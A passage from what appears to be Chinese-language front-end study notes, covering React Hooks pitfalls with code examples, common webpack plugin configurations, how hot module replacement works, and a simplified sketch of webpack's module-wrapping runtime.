        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>teacherName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> 开始上课，学生 </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>studentName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
        课程：<span class="token punctuation">{</span>couseName<span class="token punctuation">}</span>，
        讲师：<span class="token punctuation">{</span>teacherName<span class="token punctuation">}</span>，
        学生：<span class="token punctuation">{</span>studentName<span class="token punctuation">}</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> Teach
</code></pre></div><h3 id="class组件逻辑复用有哪些问题"><a href="#class组件逻辑复用有哪些问题" class="header-anchor">#</a> class组件逻辑复用有哪些问题</h3> <ul><li><strong>高级组件HOC</strong> <ul><li>组件嵌套层级过多，不易于渲染、调试</li> <li><code>HOC</code>会劫持<code>props</code>，必须严格规范</li></ul></li> <li><strong>Render Props</strong> <ul><li>学习成本高，不利于理解</li> <li>只能传递纯函数，而默认情况下纯函数功能有限</li></ul></li></ul> <h3 id="hooks组件逻辑复用有哪些好处"><a href="#hooks组件逻辑复用有哪些好处" class="header-anchor">#</a> Hooks组件逻辑复用有哪些好处</h3> <ul><li>变量作用域很明确</li> <li>不会产生组件嵌套</li></ul> <h3 id="hooks使用中的几个注意事项"><a href="#hooks使用中的几个注意事项" class="header-anchor">#</a> Hooks使用中的几个注意事项</h3> <ul><li><code>useState</code>初始化值，只有第一次有效</li> <li><code>useEffect</code>内部不能修改<code>state</code>，第二个参数需要是空的依赖<code>[]</code></li> <li><code>useEffect</code>可能出现死循环，依赖<code>[]</code>里面有对象、数组等引用类型，把引用类型拆解为值类型</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 第一个坑：`useState`初始化值，只有第一次有效</span>
<span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token comment">// 子组件</span>
<span class="token keyword">function</span> <span class="token function">Child</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> userInfo <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// render: 初始化 state</span>
    <span class="token comment">// re-render: 只恢复初始化的 state 值，不会再重新设置新的值</span>
    <span class="token comment">//            只能用 setName 修改</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span> name<span class="token punctuation">,</span> setName <span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span>userInfo<span class="token punctuation">.</span>name<span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>Child<span class="token punctuation">,</span> props name<span class="token operator">:</span> <span class="token punctuation">{</span>userInfo<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>Child<span class="token punctuation">,</span> state name<span class="token operator">:</span> <span class="token punctuation">{</span>name<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>


<span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>name<span class="token punctuation">,</span> setName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>
    <span class="token keyword">const</span> userInfo <span class="token operator">=</span> <span class="token punctuation">{</span> name <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
            Parent <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span>
            <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">'test1'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">&gt;</span>setName<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>Child userInfo<span class="token operator">=</span><span class="token punctuation">{</span>userInfo<span class="token punctuation">}</span><span class="token operator">/</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> App
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 第二个坑：`useEffect`内部不能修改`state`</span>
<span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useState<span class="token punctuation">,</span> useRef<span class="token punctuation">,</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span>

<span class="token keyword">function</span> <span class="token function">UseEffectChangeState</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token comment">// 模拟 DidMount</span>
    <span class="token keyword">const</span> countRef <span class="token operator">=</span> <span class="token function">useRef</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'useEffect...'</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span>

        <span class="token comment">// 定时任务</span>
        <span class="token keyword">const</span> timer <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'setInterval...'</span><span class="token punctuation">,</span> countRef<span class="token punctuation">.</span>current<span class="token punctuation">)</span> <span class="token comment">// 一直是0 闭包陷阱</span>
            <span class="token comment">// setCount(count + 1)</span>
            <span class="token function">setCount</span><span class="token punctuation">(</span><span class="token operator">++</span>countRef<span class="token punctuation">.</span>current<span class="token punctuation">)</span> <span class="token comment">// 解决方案使用useRef</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>

        <span class="token comment">// 清除定时任务</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// 依赖为 []</span>

    <span class="token comment">// 依赖为 [] 时： re-render 不会重新执行 effect 函数</span>
    <span class="token comment">// 没有依赖：re-render 会重新执行 effect 函数</span>

    <span class="token keyword">return</span> <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>count<span class="token operator">:</span> <span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> UseEffectChangeState
</code></pre></div><h2 id="_8-webpack"><a href="#_8-webpack" class="header-anchor">#</a> 8 Webpack</h2> <h3 id="hash、chunkhash、contenthash区别"><a href="#hash、chunkhash、contenthash区别" class="header-anchor">#</a> hash、chunkhash、contenthash区别</h3> <ul><li>如果是<code>hash</code>的话，是和整个项目有关的，有一处文件发生更改则所有文件的<code>hash</code>值都会发生改变且它们共用一个<code>hash</code>值；</li> <li>如果是<code>chunkhash</code>的话，只和<code>entry</code>的每个入口文件有关，也就是同一个<code>chunk</code>下的文件有所改动该<code>chunk</code>下的文件的<code>hash</code>值就会发生改变</li> <li>如果是<code>contenthash</code>的话，和每个生成的文件有关，只有当要构建的文件内容发生改变时才会给该文件生成新的<code>hash</code>值，并不会影响其它文件。</li></ul> <h3 id="webpack常用插件总结"><a href="#webpack常用插件总结" class="header-anchor">#</a> webpack常用插件总结</h3> <p><strong>1. 功能类</strong></p> <p><strong>1.1 html-webpack-plugin</strong></p> <blockquote><p>自动生成<code>html</code>，基本用法：</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>new HtmlWebpackPlugin({
  filename: 'index.html', // 生成文件名
  template: path.join(process.cwd(), './index.html') // 模班文件
})
</code></pre></div><p><strong>1.2 copy-webpack-plugin</strong></p> <blockquote><p>拷贝资源插件</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>new CopyWebpackPlugin([
  {
    from: path.join(process.cwd(), './vendor/'),
    to: path.join(process.cwd(), './dist/'),
    ignore: ['*.json']
  }
])
</code></pre></div><p><strong>1.3 webpack-manifest-plugin &amp;&amp; assets-webpack-plugin</strong></p> <blockquote><p>俩个插件效果一致，都是生成编译结果的资源单，只是资源单的数据结构不一致而已</p></blockquote> <p><strong>webpack-manifest-plugin 基本用法</strong></p> <div class="language- extra-class"><pre class="language-text"><code>module.exports = {
  plugins: [
    new ManifestPlugin()
  ]
}
</code></pre></div><p><strong>assets-webpack-plugin 基本用法</strong></p> <div class="language- extra-class"><pre class="language-text"><code>module.exports = {
  plugins: [
    new AssetsPlugin()
  ]
}
</code></pre></div><p><strong>1.4 clean-webpack-plugin</strong></p> <blockquote><p>在编译之前清理指定目录指定内容</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>// 清理目录
const pathsToClean = [
  'dist',
  'build'
]
 
// 清理参数
const cleanOptions = {
  exclude:  ['shared.js'], // 跳过文件
}
module.exports = {
  // ...
  plugins: [
    new CleanWebpackPlugin(pathsToClean, cleanOptions)
  ]
}
</code></pre></div><p><strong>1.5 compression-webpack-plugin</strong></p> <blockquote><p>提供带 <code>Content-Encoding</code> 编码的压缩版的资源</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>module.exports = {
  plugins: [
    new CompressionPlugin()
  ]
}
</code></pre></div><p><strong>1.6 progress-bar-webpack-plugin</strong></p> <blockquote><p>编译进度条插件</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>module.exports = {
  //...
  plugins: [
    new ProgressBarPlugin()
  ]
}
</code></pre></div><p><strong>2. 代码相关类</strong></p> <p><strong>2.1 webpack.ProvidePlugin</strong></p> <blockquote><p>自动加载模块，如 <code>$</code> 出现，就会自动加载模块；<code>$</code> 默认为<code>'jquery'</code>的<code>exports</code></p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>new webpack.ProvidePlugin({
  $: 'jquery',
})
</code></pre></div><p><strong>2.2 webpack.DefinePlugin</strong></p> <blockquote><p>定义全局常量</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>new webpack.DefinePlugin({
  'process.env': {
    NODE_ENV: JSON.stringify(process.env.NODE_ENV)
  }
})
</code></pre></div><p><strong>2.3 mini-css-extract-plugin &amp;&amp; extract-text-webpack-plugin</strong></p> <blockquote><p>提取css样式，对比</p></blockquote> <ul><li><code>mini-css-extract-plugin</code> 为<code>webpack4</code>及以上提供的<code>plugin</code>，支持<code>css chunk</code></li> <li><code>extract-text-webpack-plugin</code> 只能在<code>webpack3</code> 及一下的版本使用，不支持<code>css chunk</code></li></ul> <p><strong>基本用法 extract-text-webpack-plugin</strong></p> <div class="language- extra-class"><pre class="language-text"><code>const ExtractTextPlugin = require(&quot;extract-text-webpack-plugin&quot;);
 
module.exports = {
  module: {
    rules: [
      {
        test: /\.css$/,
        use: ExtractTextPlugin.extract({
          fallback: &quot;style-loader&quot;,
          use: &quot;css-loader&quot;
        })
      }
    ]
  },
  plugins: [
    new ExtractTextPlugin(&quot;styles.css&quot;),
  ]
}
</code></pre></div><p><strong>基本用法 mini-css-extract-plugin</strong></p> <div class="language- extra-class"><pre class="language-text"><code>const MiniCssExtractPlugin = require(&quot;mini-css-extract-plugin&quot;);
module.exports = {
    module: {
    rules: [
      {
        test: /\.css$/,
        use: [
          {
            loader: MiniCssExtractPlugin.loader,
            options: {
              publicPath: '/'  // chunk publicPath
            }
          },
          &quot;css-loader&quot;
        ]
      }
    ]
  },
  plugins: [
    new MiniCssExtractPlugin({
      filename: &quot;[name].css&quot;, // 主文件名
      chunkFilename: &quot;[id].css&quot;  // chunk文件名
    })
  ]
}
</code></pre></div><p><strong>3. 编译结果优化类</strong></p> <p><strong>3.1 wbepack.IgnorePlugin</strong></p> <blockquote><p>忽略<code>regExp</code>匹配的模块</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>new webpack.IgnorePlugin(/^\.\/locale$/, /moment$/)
</code></pre></div><p><strong>3.2 uglifyjs-webpack-plugin</strong></p> <blockquote><p>代码丑化，用于js压缩</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>module.exports = {
  //...
  optimization: {
    minimizer: [new UglifyJsPlugin({
      cache: true,   // 开启缓存
      parallel: true, // 开启多线程编译
      sourceMap: true,  // 是否sourceMap
      uglifyOptions: {  // 丑化参数
        comments: false,
        warnings: false,
        compress: {
          unused: true,
          dead_code: true,
          collapse_vars: true,
          reduce_vars: true
        },
        output: {
          comments: false
        }
      }
    }]
  }
};
</code></pre></div><p><strong>3.3 optimize-css-assets-webpack-plugin</strong></p> <blockquote><p>css压缩，主要使用 <code>cssnano</code> 压缩器 https://github.com/cssnano/cssnano</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>module.exports = {
  //...
  optimization: {
    minimizer: [new OptimizeCssAssetsPlugin({
      cssProcessor: require('cssnano'),   // css 压缩优化器
      cssProcessorOptions: { discardComments: { removeAll: true } } // 去除所有注释
    })]
  }
};
</code></pre></div><p><strong>3.4 webpack-md5-hash</strong></p> <blockquote><p>使你的<code>chunk</code>根据内容生成<code>md5</code>，用这个<code>md5</code>取代 <code>webpack chunkhash</code>。</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>var WebpackMd5Hash = require('webpack-md5-hash');
 
module.exports = {
  // ...
  output: {
    //...
    chunkFilename: &quot;[chunkhash].[id].chunk.js&quot;
  },
  plugins: [
    new WebpackMd5Hash()
  ]
};
</code></pre></div><p><strong>3.5 SplitChunksPlugin</strong></p> <ul><li><code>CommonChunkPlugin</code> 的后世，用于<code>chunk</code>切割。</li></ul> <blockquote><p><code>webpack</code> 把 <code>chunk</code> 分为两种类型，一种是初始加载<code>initial chunk</code>，另外一种是异步加载 <code>async chunk</code>，如果不配置<code>SplitChunksPlugin</code>，<code>webpack</code>会在<code>production</code>的模式下自动开启，默认情况下，<code>webpack</code>会将 <code>node_modules</code> 下的所有模块定义为异步加载模块，并分析你的 <code>entry</code>、动态加载（<code>import()</code>、<code>require.ensure</code>）模块，找出这些模块之间共用的<code>node_modules</code>下的模块，并将这些模块提取到单独的<code>chunk</code>中，在需要的时候异步加载到页面当中，其中默认配置如下</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>module.exports = {
  //...
  optimization: {
    splitChunks: {
      chunks: 'async', // 异步加载chunk
      minSize: 30000,
      maxSize: 0,
      minChunks: 1,
      maxAsyncRequests: 5,
      maxInitialRequests: 3,
      automaticNameDelimiter: '~', // 文件名中chunk分隔符
      name: true,
      cacheGroups: {
        vendors: {
          test: /[\\/]node_modules[\\/]/,  // 
          priority: -10
        },
        default: {
          minChunks: 2,  // 最小的共享chunk数
          priority: -20,
          reuseExistingChunk: true
        }
      }
    }
  }
};
</code></pre></div><p><strong>4. 编译优化类</strong></p> <p><strong>4.1 DllPlugin &amp;&amp; DllReferencePlugin &amp;&amp; autodll-webpack-plugin</strong></p> <ul><li><code>dllPlugin</code>将模块预先编译，<code>DllReferencePlugin</code> 将预先编译好的模块关联到当前编译中，当 <code>webpack</code> 解析到这些模块时，会直接使用预先编译好的模块。</li> <li><code>autodll-webpack-plugin</code> 相当于 <code>dllPlugin</code> 和 <code>DllReferencePlugin</code> 的简化版，其实本质也是使用 <code>dllPlugin &amp;&amp; DllReferencePlugin</code>，它会在第一次编译的时候将配置好的需要预先编译的模块编译在缓存中，第二次编译的时候，解析到这些模块就直接使用缓存，而不是去编译这些模块</li></ul> <p><strong>dllPlugin 基本用法：</strong></p> <div class="language- extra-class"><pre class="language-text"><code>const output = {
  filename: '[name].js',
  library: '[name]_library',
  path: './vendor/'
}

module.exports = {
  entry: {
    vendor: ['react', 'react-dom']  // 我们需要事先编译的模块，用entry表示
  },
  output: output,
  plugins: [
    new webpack.DllPlugin({  // 使用dllPlugin
      path: path.join(output.path, `${output.filename}.json`),
      name: output.library // 全局变量名， 也就是 window 下 的 [output.library]
    })
  ]
}
</code></pre></div><p><strong>DllReferencePlugin 基本用法：</strong></p> <div class="language- extra-class"><pre class="language-text"><code>const manifest = path.resolve(process.cwd(), 'vendor', 'vendor.js.json')

module.exports = {
  plugins: [
    new webpack.DllReferencePlugin({
      manifest: require(manifest), // 引进dllPlugin编译的json文件
      name: 'vendor_library' // 全局变量名，与dllPlugin声明的一致
    }
  ]
}
</code></pre></div><p><strong>autodll-webpack-plugin 基本用法：</strong></p> <div class="language- extra-class"><pre class="language-text"><code>module.exports = {
  plugins: [
    new AutoDllPlugin({
      inject: true, // 与 html-webpack-plugin 结合使用，注入html中
      filename: '[name].js',
      entry: {
        vendor: [
          'react',
          'react-dom'
        ]
      }
    })
  ]
}
</code></pre></div><p><strong>4.2 happypack &amp;&amp; thread-loader</strong></p> <blockquote><p>多线程编译，加快编译速度，<code>thread-loader</code>不可以和 <code>mini-css-extract-plugin</code> 结合使用</p></blockquote> <p><strong>happypack 基本用法</strong></p> <div class="language- extra-class"><pre class="language-text"><code>const HappyPack = require('happypack');
const os = require('os');
const happyThreadPool = HappyPack.ThreadPool({ size: os.cpus().length });
const happyLoaderId = 'happypack-for-react-babel-loader';

module.exports = {
  module: {
    rules: [{
      test: /\.jsx?$/,
      loader: 'happypack/loader',
      query: {
        id: happyLoaderId
      },
      include: [path.resolve(process.cwd(), 'src')]
    }]
  },
  plugins: [new HappyPack({
    id: happyLoaderId,
    threadPool: happyThreadPool,
    loaders: ['babel-loader']
  })]
}
</code></pre></div><p><strong>thread-loader 基本用法</strong></p> <div class="language- extra-class"><pre class="language-text"><code>module.exports = {
  module: {
    rules: [
      {
        test: /\.js$/,
        include: path.resolve(&quot;src&quot;),
        use: [
          &quot;thread-loader&quot;,
          // your expensive loader (e.g babel-loader)
          &quot;babel-loader&quot;
        ]
      }
    ]
  }
}
</code></pre></div><p><strong>4.3 hard-source-webpack-plugin &amp;&amp; cache-loader</strong></p> <blockquote><p>使用模块编译缓存，加快编译速度</p></blockquote> <p><strong>hard-source-webpack-plugin 基本用法</strong></p> <div class="language- extra-class"><pre class="language-text"><code>module.exports = {
  plugins: [
    new HardSourceWebpackPlugin()
  ]
}
</code></pre></div><p><strong>cache-loader 基本用法</strong></p> <div class="language- extra-class"><pre class="language-text"><code>module.exports = {
  module: {
    rules: [
      {
        test: /\.ext$/,
        use: [
          'cache-loader',
          ...loaders
        ],
        include: path.resolve('src')
      }
    ]
  }
}
</code></pre></div><p><strong>5. 编译分析类</strong></p> <p><strong>5.1 webpack-bundle-analyzer</strong></p> <blockquote><p>编译模块分析插件</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>new BundleAnalyzerPlugin({
  analyzerMode: 'server',
  analyzerHost: '127.0.0.1',
  analyzerPort: 8889,
  reportFilename: 'report.html',
  defaultSizes: 'parsed',
  generateStatsFile: false,
  statsFilename: 'stats.json',
  statsOptions: null,
  logLevel: 'info'
}),
</code></pre></div><p><strong>5.2 stats-webpack-plugin &amp;&amp; PrefetchPlugin</strong></p> <blockquote><p><code>stats-webpack-plugin</code> 将构建的统计信息写入文件，该文件可在 http://webpack.github.io/analyse中上传进行编译分析，并根据分析结果，可使用 <code>PrefetchPlugin</code> 对部分模块进行预解析编译</p></blockquote> <p><strong>stats-webpack-plugin 基本用法：</strong></p> <div class="language- extra-class"><pre class="language-text"><code>module.exports = {
  plugins: [
    new StatsPlugin('stats.json', {
      chunkModules: true,
      exclude: [/node_modules[\\\/]react/]
    })
  ]
};
</code></pre></div><p><strong>PrefetchPlugin 基本用法：</strong></p> <div class="language- extra-class"><pre class="language-text"><code>module.exports = {
  plugins: [
    new webpack.PrefetchPlugin('/web/', 'app/modules/HeaderNav.jsx'),
    new webpack.PrefetchPlugin('/web/', 'app/pages/FrontPage.jsx')
];
}
</code></pre></div><p><strong>5.3 speed-measure-webpack-plugin</strong></p> <blockquote><p>统计编译过程中，各<code>loader</code>和<code>plugin</code>使用的时间</p></blockquote> <div class="language- extra-class"><pre class="language-text"><code>const SpeedMeasurePlugin = require(&quot;speed-measure-webpack-plugin&quot;);
 
const smp = new SpeedMeasurePlugin();
 
const webpackConfig = {
  plugins: [
    new MyPlugin(),
    new MyOtherPlugin()
  ]
}
module.exports = smp.wrap(webpackConfig);
</code></pre></div><h3 id="webpack热更新原理"><a href="#webpack热更新原理" class="header-anchor">#</a> webpack热更新原理</h3> <p><img alt="" data-src="https://s.poetries.work/images/20210319101659.png" loading="lazy" class="lazy"></p> <ul><li>当修改了一个或多个文件；</li> <li>文件系统接收更改并通知 <code>webpack</code>；</li> <li><code>webpack</code> 重新编译构建一个或多个模块，并通知 <code>HMR</code> 服务器进行更新；</li> <li><code>HMR Server</code> 使用 <code>webSocket</code> 通知 <code>HMR runtime</code> 需要更新，<code>HMR</code> 运行时通过 <code>HTTP</code> 请求更新 <code>jsonp</code></li> <li><code>HMR</code> 运行时替换更新中的模块，如果确定这些模块无法更新，则触发整个页面刷新</li></ul> <h3 id="webpack原理简述"><a href="#webpack原理简述" class="header-anchor">#</a> webpack原理简述</h3> <p><strong>1.1 核心概念</strong></p> <blockquote><p>JavaScript 的 模块打包工具 (module bundler)。通过分析模块之间的依赖，最终将所有模块打包成一份或者多份代码包 (bundler)，供 HTML 直接引用。实质上，Webpack 仅仅提供了 打包功能 和一套 文件处理机制，然后通过生态中的各种 Loader 和 Plugin 对代码进行预编译和打包。因此 Webpack 具有高度的可拓展性，能更好的发挥社区生态的力量。</p></blockquote> <ul><li><strong>Entry</strong>: 入口文件，<code>Webpack</code>会从该文件开始进行分析与编译；</li> <li><strong>Output</strong>: 出口路径，打包后创建 <code>bundler</code>的文件路径以及文件名；</li> <li><strong>Module</strong>: 模块，在 <code>Webpack</code> 中任何文件都可以作为一个模块，会根据配置的不同的 <code>Loader</code> 进行加载和打包；</li> <li><strong>Chunk</strong>: 代码块，可以根据配置，将所有模块代码合并成一个或多个代码块，以便按需加载，提高性能；</li> <li><strong>Loader</strong>: 模块加载器，进行各种文件类型的加载与转换；</li> <li><strong>Plugin</strong>: 拓展插件，可以通过 <code>Webpack</code> 相应的事件钩子，介入到打包过程中的任意环节，从而对代码按需修改；</li></ul> <p><strong>1.2 工作流程 (加载 - 编译 - 输出)</strong></p> <ol><li>读取配置文件，按命令 初始化 配置参数，创建 <code>Compiler</code> 对象；</li> <li>调用插件的 <code>apply</code> 方法 挂载插件 监听，然后从入口文件开始执行编译；</li> <li>按文件类型，调用相应的 <code>Loader</code> 对模块进行 编译，并在合适的时机点触发对应的事件，调用 <code>Plugin</code> 执行，最后再根据模块 依赖查找 到所依赖的模块，递归执行第三步；</li> <li>将编译后的所有代码包装成一个个代码块 (<code>Chuck</code>)， 并按依赖和配置确定 输出内容。这个步骤，仍然可以通过 <code>Plugin</code> 进行文件的修改;</li> <li>最后，根据 <code>Output</code> 把文件内容一一写入到指定的文件夹中，完成整个过程；</li></ol> <p><strong>1.3 模块包装</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">modules</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token comment">// 模拟 require 函数，从内存中加载模块；</span>
	<span class="token keyword">function</span> <span class="token function">__webpack_require__</span><span class="token punctuation">(</span><span class="token parameter">moduleId</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">// 缓存模块</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>installedModules<span class="token punctuation">[</span>moduleId<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">return</span> installedModules<span class="token punctuation">[</span>moduleId<span class="token punctuation">]</span><span class="token punctuation">.</span>exports<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		
		<span class="token keyword">var</span> module <span class="token operator">=</span> installedModules<span class="token punctuation">[</span>moduleId<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
			<span class="token literal-property property">i</span><span class="token operator">:</span> moduleId<span class="token punctuation">,</span>
			<span class="token literal-property property">l</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
			<span class="token literal-property property">exports</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
		<span class="token punctuation">}</span><span class="token punctuation">;</span>
		
		<span class="token comment">// 执行代码；</span>
		modules<span class="token punctuation">[</span>moduleId<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>module<span class="token punctuation">.</span>exports<span class="token punctuation">,</span> module<span class="token punctuation">,</span> module<span class="token punctuation">.</span>exports<span class="token punctuation">,</span> __webpack_require__<span class="token punctuation">)</span><span class="token punctuation">;</span>
		
		<span class="token comment">// Flag: 标记是否加载完成；</span>
		module<span class="token punctuation">.</span>l <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
		
		<span class="token keyword">return</span> module<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token comment">// ...</span>
	
	<span class="token comment">// 开始执行加载入口文件；</span>
	<span class="token keyword">return</span> <span class="token function">__webpack_require__</span><span class="token punctuation">(</span>__webpack_require__<span class="token punctuation">.</span>s <span class="token operator">=</span> <span class="token string">&quot;./src/index.js&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
 	<span class="token string-property property">&quot;./src/index.js&quot;</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> __webpack_exports__<span class="token punctuation">,</span> __webpack_require__</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">// 使用 eval 执行编译后的代码；</span>
		<span class="token comment">// 继续递归引用模块内部依赖；</span>
		<span class="token comment">// 实际情况并不是使用模板字符串，这里是为了代码的可读性；</span>
		<span class="token function">eval</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
			__webpack_require__.r(__webpack_exports__);
			//
			var _test__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(&quot;test&quot;, ./src/test.js&quot;);
		</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token punctuation">,</span>
	<span class="token string-property property">&quot;./src/test.js&quot;</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> __webpack_exports__<span class="token punctuation">,</span> __webpack_require__</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">// ...</span>
	<span class="token punctuation">}</span><span class="token punctuation">,</span>
 <span class="token punctuation">}</span><span class="token punctuation">)</span>
